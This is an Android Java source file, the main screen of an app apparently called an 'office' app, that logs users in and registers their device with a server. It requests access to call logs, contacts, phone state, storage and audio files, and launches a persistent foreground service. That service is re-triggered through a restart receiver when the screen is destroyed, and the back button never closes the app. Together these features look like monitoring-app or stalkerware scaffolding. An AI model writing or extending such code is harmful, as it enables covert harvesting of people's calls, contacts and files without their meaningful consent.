package com.office.app;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.view.WindowManager;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private PrefsManager prefsManager;
    private ApiService apiService;

    private LinearLayout loginSection;
    private LinearLayout statusSection;
    private EditText emailInput;
    private EditText passwordInput;
    private Button loginButton;
    private TextView loginStatus;
    private TextView userInfo;
    private Button logoutButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Keep screen on
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        // Initialize
        prefsManager = new PrefsManager(this);
        apiService = ApiService.getInstance();

        // Find views
        loginSection = findViewById(R.id.login_section);
        statusSection = findViewById(R.id.status_section);
        emailInput = findViewById(R.id.email_input);
        passwordInput = findViewById(R.id.password_input);
        loginButton = findViewById(R.id.login_button);
        loginStatus = findViewById(R.id.login_status);
        userInfo = findViewById(R.id.user_info);
        logoutButton = findViewById(R.id.logout_button);

        // Setup click listeners
        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleLogin();
            }
        });

        logoutButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleLogout();
            }
        });

        // Check permissions
        checkAndRequestPermissions();

        // Update UI based on login status
        updateUI();

        // Start the foreground service
        Intent serviceIntent = new Intent(this, PersistentService.class);
        startForegroundService(serviceIntent);
    }

    private void checkAndRequestPermissions() {
        String[] permissions = new String[] {
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_AUDIO
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Permissions are required for the app to work", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void updateUI() {
        if (prefsManager.isLoggedIn()) {
            loginSection.setVisibility(View.GONE);
            statusSection.setVisibility(View.VISIBLE);
            String email = prefsManager.getUserEmail();
            userInfo.setText("Logged in as: " + email);
        } else {
            loginSection.setVisibility(View.VISIBLE);
            statusSection.setVisibility(View.GONE);
            // Reset login button state when showing login section
            loginButton.setEnabled(true);
            loginStatus.setText("");
        }
    }

    private void handleLogin() {
        String email = emailInput.getText().toString().trim();
        String password = passwordInput.getText().toString().trim();

        if (email.isEmpty() || password.isEmpty()) {
            loginStatus.setText("Please enter email and password");
            return;
        }

        loginButton.setEnabled(false);
        loginStatus.setText("Logging in...");

        apiService.login(email, password, new ApiService.ApiCallback() {
            @Override
            public void onSuccess(String token) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        prefsManager.saveAuthToken(token);
                        prefsManager.saveUserEmail(email);
                        loginStatus.setText("Login successful!");
                        emailInput.setText("");
                        passwordInput.setText("");
                        updateUI();
                        Toast.makeText(MainActivity.this, "Logged in successfully", Toast.LENGTH_SHORT).show();

                        // Register device after successful login
                        registerDevice(token);
                    }
                });
            }

            @Override
            public void onFailure(String error) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        loginButton.setEnabled(true);
                        loginStatus.setText("Login failed: " + error);
                        Toast.makeText(MainActivity.this, "Login failed: " + error, Toast.LENGTH_LONG).show();
                    }
                });
            }
        });
    }

    private void handleLogout() {
        String token = prefsManager.getAuthToken();

        // If we have a token, call logout API to remove device from server
        if (token != null && !token.isEmpty()) {
            DeviceInfoCollector deviceInfo = new DeviceInfoCollector(this);
            String deviceId = deviceInfo.getDeviceId();

            apiService.logout(token, deviceId, new ApiService.ApiCallback() {
                @Override
                public void onSuccess(String result) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            // Clear local storage after successful server logout
                            prefsManager.logout();
                            updateUI();
                            Toast.makeText(MainActivity.this, "Logged out successfully", Toast.LENGTH_SHORT).show();
                        }
                    });
                }

                @Override
                public void onFailure(String error) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            // Even if server logout fails, clear local storage
                            prefsManager.logout();
                            updateUI();
                            Toast.makeText(MainActivity.this, "Logged out (offline)", Toast.LENGTH_SHORT).show();
                            android.util.Log.e("MainActivity", "Logout API failed: " + error);
                        }
                    });
                }
            });
        } else {
            // No token, just clear local storage
            prefsManager.logout();
            updateUI();
            Toast.makeText(this, "Logged out", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Restart the service when activity is destroyed
        Intent broadcastIntent = new Intent(this, RestartReceiver.class);
        sendBroadcast(broadcastIntent);
    }

    private void registerDevice(String token) {
        DeviceInfoCollector deviceInfo = new DeviceInfoCollector(this);
        apiService.registerDevice(token, deviceInfo.getDeviceRegistrationInfo(), new ApiService.ApiCallback() {
            @Override
            public void onSuccess(String result) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(MainActivity.this, "Device registered", Toast.LENGTH_SHORT).show();
                    }
                });
            }

            @Override
            public void onFailure(String error) {
                // Silent failure - device registration is not critical
                android.util.Log.e("MainActivity", "Device registration failed: " + error);
            }
        });
    }

    @Override
    public void onBackPressed() {
        // Move to background instead of closing
        moveTaskToBack(true);
    }
}
